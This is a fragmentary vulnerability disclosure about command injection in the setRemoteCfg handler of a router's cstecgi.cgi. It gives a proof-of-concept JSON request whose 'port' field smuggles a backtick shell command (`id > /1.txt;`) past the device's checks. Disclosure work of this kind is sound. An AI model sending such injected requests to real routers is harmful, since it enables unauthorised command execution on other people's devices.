...
The vulnerability is located in the function `sub_4111F8` within `cstecgi.cgi`, also known as `setRemoteCfg`.

![](Pasted%20image%2020231129170528.png)
...
therefore , by controlling parameter among `enable,port` , we can finally make an arbitrary command execution
...
{"enable":"1","port":"`id > /1.txt;`","topicurl":"setRemoteCfg","token":"00000000000000000000000000000000"}
~~~
...
![](Pasted%20image%2020231129170713.png)